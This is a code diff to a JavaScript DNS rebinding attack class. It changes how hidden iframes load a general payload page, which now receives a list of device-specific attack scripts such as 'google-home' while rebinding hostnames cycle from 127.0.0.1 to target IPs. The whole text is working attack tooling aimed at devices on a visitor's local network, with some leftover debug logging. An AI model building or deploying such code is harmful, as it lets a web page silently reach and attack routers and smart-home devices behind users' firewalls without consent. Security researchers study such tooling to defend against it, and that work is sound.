@@ -40,8 +40,10 @@ class DNSRebindAttack extends EventEmitter {
 
     attack(ips, firstIp='127.0.0.1', payloads=['google-home'], interval=250) {
         let timeout = 0
+	console.log('payloads')
+        console.log(payloads)
         ips.forEach(ip => {
-            setTimeout(() => this._loadIframe(firstIp, ip, this.domain, this.port, 'payloads/general.html'), timeout += interval)
+            setTimeout(() => this._loadIframe(firstIp, ip, this.domain, this.port, payloads), timeout += interval)
         })
         setTimeout(() => this.emit('all-iframes-added'), timeout)
     }
@@ -141,12 +143,16 @@ class DNSRebindAttack extends EventEmitter {
         })
     }
 
-    _loadIframe(firstIp, secondIp, domain, port, payload) {
+    // payload - general.html - general file that launch an attack using the 'payloads' js files.
+    // payloads - list of javascript files contain an attack for each unquie device
+    _loadIframe(firstIp, secondIp, domain, port, payloads) {
         const iframe = document.createElement('iframe')
         let host = `a.${firstIp}.1time.${secondIp}.forever.${this._uuidv4()}.${domain}`
         if (port != 80) host += `:${port}`
         host = host.toLowerCase()
-        iframe.src = `http://${host}/${payload}`
+        var payload = 'payloads/general.html'
+        const params = payloads.join(',') // suppose to be the list of payloads
+        iframe.src = `http://${host}/${payload}?payloads=${params}`
         iframe.style = 'display: none;'
         document.body.appendChild(iframe)
 
